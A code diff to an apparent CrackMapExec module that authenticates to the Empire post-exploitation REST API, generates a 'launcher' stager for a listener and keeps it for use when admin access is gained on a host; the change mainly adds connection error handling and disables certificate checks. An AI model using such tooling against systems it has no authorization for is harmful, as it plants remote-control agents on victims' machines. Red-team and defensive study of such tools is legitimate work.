@@ -1,11 +1,9 @@
-import logging
-import requests
 import sys
+import requests
+from requests import ConnectionError
 
 #The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 requests.packages.urllib3.disable_warnings()
-logging.getLogger("requests").setLevel(logging.WARNING)
-logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 class CMEModule:
     '''
@@ -35,17 +33,23 @@ class CMEModule:
         #Pull the host and port from the config file
         base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))
 
-        r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
-        if r.status_code == 200:
-            token = r.json()['token']
+        try:
+            r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
+            if r.status_code == 200:
+                token = r.json()['token']
 
-            payload = {'StagerName': 'launcher', 'Listener': module_options['LISTENER']}
-            r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
-            self.empire_launcher = r.json()['launcher']['Output']
+                payload = {'StagerName': 'launcher', 'Listener': module_options['LISTENER']}
+                r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
+                self.empire_launcher = r.json()['launcher']['Output']
 
-            context.log.success("Successfully generated launcher for listener '{}'".format(module_options['LISTENER']))
-        else:
-            context.log.error("Error authenticating to Empire's RESTful API server!")
+                context.log.success("Successfully generated launcher for listener '{}'".format(module_options['LISTENER']))
+            else:
+                context.log.error("Error authenticating to Empire's RESTful API server!")
+                sys.exit(1)
+
+        except ConnectionError as e:
+            context.log.error("Unable to connect to Empire's RESTful API: {}".format(e))
+            sys.exit(1)
 
     def on_admin_login(self, context, connection):
         if self.empire_launcher:
